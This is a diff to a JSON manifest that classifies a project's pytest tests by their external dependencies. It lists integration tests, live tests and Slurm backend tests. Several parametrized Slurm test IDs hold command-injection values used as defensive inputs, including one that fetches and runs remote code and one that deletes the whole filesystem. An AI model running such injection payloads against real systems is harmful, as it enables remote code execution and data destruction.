+      "nodeid": "tests/integration/state/test_preparations.py::test_a_retried_preparation_adds_to_the_history_rather_than_replacing_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_preparations.py::test_a_workspace_reads_back_field_for_field",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_preparations.py::test_each_contract_version_is_its_own_history",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_preparations.py::test_the_refusal_reported_as_stopping_a_node_is_the_newest_one",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -6634,6 +8733,160 @@
       ]
     },
     {
+      "nodeid": "tests/integration/state/test_services.py::test_a_clock_that_went_backwards_is_not_read_as_ancient_silence",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_a_process_may_not_be_renamed_into_another_services_row",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_a_replacement_clears_the_shutdown_it_is_replacing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_a_report_is_written_with_the_instance_it_came_from",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_a_report_may_be_updated_in_place_without_being_a_log",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_a_second_beat_replaces_the_first_rather_than_joining_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_a_service_that_has_stopped_may_not_be_deleted_out_of_the_table",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_a_service_that_said_it_was_going_is_not_a_service_that_went_quiet",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_every_service_is_read_back_in_name_order",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_never_having_reported_is_not_the_same_as_having_gone_quiet",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_reading_a_service_that_never_reported_is_none_and_not_an_empty_row",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_retiring_something_that_never_reported_does_not_invent_a_row",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_the_instance_a_report_carries_is_this_process",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/state/test_services.py::test_the_service_names_are_a_closed_list_of_three",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
       "nodeid": "tests/integration/state/test_transitions.py::test_a_completed_project_is_final",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -7008,6 +9261,138 @@
       ]
     },
     {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_a_contract_naming_an_environment_nobody_can_build_refuses_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_a_contract_that_cannot_be_built_parks_the_node_and_starts_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_a_contract_that_names_no_environment_runs_exactly_as_before",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_a_lab_contract_that_states_no_procedure_parks_the_node",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_a_lab_run_is_handed_the_package_and_the_criteria_it_will_be_judged_by",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_a_resolved_input_with_no_store_refuses_the_run",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_a_run_that_needs_an_environment_runs_in_the_workspace_built_for_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_an_input_nothing_answers_does_not_need_an_object_store",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/integration/temporal/test_preparation.py::test_the_same_run_prepares_one_workspace_however_often_it_is_read",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": [
+        "postgres",
+        "temporal",
+        "minio"
+      ]
+    },
+    {
+      "nodeid": "tests/live_research/test_live_deep_read.py::test_a_real_pages_text_is_not_reachable_by_character_offset",
+      "classification": "external",
+      "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
+      "marker": "live",
+      "external_resources": [
+        "DEEPSEEK_API_KEY",
+        "internet",
+        "DSH runtime"
+      ]
+    },
+    {
+      "nodeid": "tests/live_research/test_live_deep_read.py::test_a_real_papers_body_can_be_searched_and_the_place_found",
+      "classification": "external",
+      "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
+      "marker": "live",
+      "external_resources": [
+        "DEEPSEEK_API_KEY",
+        "internet",
+        "DSH runtime"
+      ]
+    },
+    {
+      "nodeid": "tests/live_research/test_live_deep_read.py::test_a_real_papers_pages_are_readable_again_after_registration",
+      "classification": "external",
+      "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
+      "marker": "live",
+      "external_resources": [
+        "DEEPSEEK_API_KEY",
+        "internet",
+        "DSH runtime"
+      ]
+    },
+    {
       "nodeid": "tests/live_research/test_live_research_tools.py::test_a_claim_a_session_files_is_rated_by_the_source_it_read",
       "classification": "external",
       "reason": "requires a real model, real Internet, or a pinned live DSH runtime",
@@ -7179,7 +9564,28 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/premium/T01/test_lock.py::test_default_lock_dir_is_shared_on_posix",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_lock.py::test_lock_dir_honors_injected_environment",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/premium/T01/test_lock.py::test_lock_path_is_stable_and_database_specific",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_lock.py::test_lock_path_normalizes_localhost_alias",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -7207,6 +9613,20 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/premium/T01/test_preflight.py::test_main_returns_nonzero_for_failed_os",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_preflight.py::test_main_returns_nonzero_for_failed_python",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/premium/T01/test_preflight.py::test_missing_compose_fails",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -7221,7 +9641,7 @@
       "external_resources": []
     },
     {
-      "nodeid": "tests/premium/T01/test_preflight.py::test_noncanonical_os_can_be_explicitly_downgraded",
+      "nodeid": "tests/premium/T01/test_preflight.py::test_missing_git_fails",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -7250,6 +9670,20 @@
     },
     {
       "nodeid": "tests/premium/T01/test_preflight.py::test_python_312_is_required",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_backslash_marker_overrides_false_declaration",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_database_suite_is_auto_locked",
       "classification": "internal",
       "reason": "deterministic local test",
       "marker": null,
@@ -7298,6 +9732,62 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_no_trailing_slash_marker_overrides_false_declaration",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_non_database_task_can_opt_out",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_parent_pytest_selection_overrides_false_declaration[pytest --maxfail=1 tests]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_parent_pytest_selection_overrides_false_declaration[pytest -q tests]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_parent_pytest_selection_overrides_false_declaration[pytest -x tests]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_parent_pytest_selection_overrides_false_declaration[pytest tests/unit tests]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_parent_pytest_selection_overrides_false_declaration[python -m pytest -q tests]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_preflight_failure_is_not_pass",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/premium/T01/test_task_runner.py::test_pytest_junit_is_created",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -7312,6 +9802,20 @@
       "external_resources": []
     },
     {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_t01_declared_commands_are_not_database_suites",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/premium/T01/test_task_runner.py::test_undeclared_task_locks_by_default",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
       "nodeid": "tests/premium/T01/test_task_runner.py::test_unknown_task_fails",
       "classification": "internal",
       "reason": "deterministic local test",
@@ -7320,6 +9824,692 @@
     },
     {
       "nodeid": "tests/premium/T01/test_task_runner.py::test_unmapped_acceptance_criteria_fails_before_running",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_binary_output_is_read_without_decoding_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_contract_that_names_no_workspace_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_delivery_to_a_slurm_job_is_reported_and_changes_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_failure_class_is_reported_only_when_the_job_has_ended",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_already_queued_under_this_name_is_adopted",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[CANCELLED-CANCELLED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[COMPLETED-COMPLETED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[FAILED-FAILED-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[NODE_FAIL-FAILED-INFRA_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[OUT_OF_MEMORY-FAILED-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[PENDING-SUBMITTED-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[RUNNING-RUNNING-None]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_state_is_reported_in_ravels_words_beside_slurms[TIMEOUT-TIMED_OUT-NON_RETRYABLE]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_that_has_left_the_queue_is_still_recognised",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_job_the_scheduler_has_no_record_of_is_a_failure_ravel_cannot_classify",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_reference_carries_a_digest_of_the_work_and_nothing_else",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_reference_the_backend_did_not_make_is_refused[7001]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_reference_the_backend_did_not_make_is_refused[]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_reference_the_backend_did_not_make_is_refused[other:7001:abc]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_reference_the_backend_did_not_make_is_refused[slurm:7001:abc:extra]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_reference_the_backend_did_not_make_is_refused[slurm:7001]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_reference_the_backend_did_not_make_is_refused[slurm:notanumber:abc]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_retry_gets_its_own_directory_so_it_cannot_read_the_attempt_before_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_running_job_is_read_from_the_queue_not_the_log",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_scheduler_that_cannot_answer_is_a_fault_and_not_a_status",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_scheduler_that_refuses_the_job_says_what_it_said",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_second_submit_of_the_same_work_does_not_start_a_second_job",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_symlink_in_a_workspace_is_refused_rather_than_uploaded",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_value_that_is_not_a_name_cannot_become_a_second_command[$(cat /etc/passwd)]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_value_that_is_not_a_name_cannot_become_a_second_command[' ; curl http://example.invalid | sh ; ']",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_value_that_is_not_a_name_cannot_become_a_second_command[; rm -rf /]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_value_that_is_not_a_name_cannot_become_a_second_command[\\nnewline]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_value_that_is_not_a_name_cannot_become_a_second_command[`id`]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_value_that_is_not_a_name_cannot_become_a_second_command[a b]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_workspace_that_is_not_on_this_machine_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_a_workspace_with_nothing_in_it_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_an_entrypoint_the_contract_does_not_name_is_refused",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_cancelling_a_finished_job_is_refused_rather_than_raised",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_cancelling_a_running_job_asks_the_scheduler_to_stop_it",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_submitting_uploads_the_workspace_and_starts_the_job",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_the_digest_is_the_same_whether_or_not_this_process_made_the_first_call",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_the_job_is_named_for_the_work_and_runs_in_its_own_directory",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_the_password_is_not_a_field_of_the_backend",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_the_password_is_nowhere_in_what_the_backend_hands_back",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_the_progress_of_a_finished_job_carries_the_schedulers_account",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_backend.py::test_the_scheduler_refusing_the_job_does_not_echo_the_password",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_a_command_result_describes_itself_without_being_asked[-no output]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_a_command_result_describes_itself_without_being_asked[sshpass: password authentication failed-password authentication]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_a_failed_command_is_not_ok_and_a_successful_one_is",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_a_mapping_is_a_new_dictionary",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_a_mapping_is_redacted_value_by_value_and_leaves_numbers_alone",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_a_redactor_with_no_secrets_changes_nothing",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_a_secret_is_removed_wherever_it_appears",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_an_empty_secret_is_skipped_rather_than_substituted",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_an_ordinary_message_passes_through_unchanged",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_key_material_echoed_by_the_far_side_never_becomes_a_message",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_ssh.py::test_several_secrets_are_all_removed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_machine_that_failed_is_worth_asking_again[BOOT_FAIL]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_machine_that_failed_is_worth_asking_again[NODE_FAIL]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_machine_that_failed_is_worth_asking_again[PREEMPTED]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_resource_limit_is_not_a_machine_fault",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_ravel_does_not_know_is_reported_rather_than_guessed",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_string_is_reduced_to_the_word_it_is_about[  RUNNING  -RUNNING]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_string_is_reduced_to_the_word_it_is_about[CANCELLED by 1000-CANCELLED]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_string_is_reduced_to_the_word_it_is_about[COMPLETING+-COMPLETING]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_string_is_reduced_to_the_word_it_is_about[FAILED by user-FAILED]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_string_is_reduced_to_the_word_it_is_about[OUT_OF_MEMORY-OUT_OF_MEMORY]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_string_is_reduced_to_the_word_it_is_about[PENDING-PENDING]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_a_state_string_is_reduced_to_the_word_it_is_about[pending-PENDING]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_exit_code_is_read_from_the_batch_step_first[0:0--0-]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
+      "nodeid": "tests/unit/backends/slurm/test_states.py::test_an_exit_code_is_read_from_the_batch_step_first[0:0-0:0-0-]",
+      "classification": "internal",
+      "reason": "deterministic local test",
+      "marker": null,
+      "external_resources": []
+    },
+    {
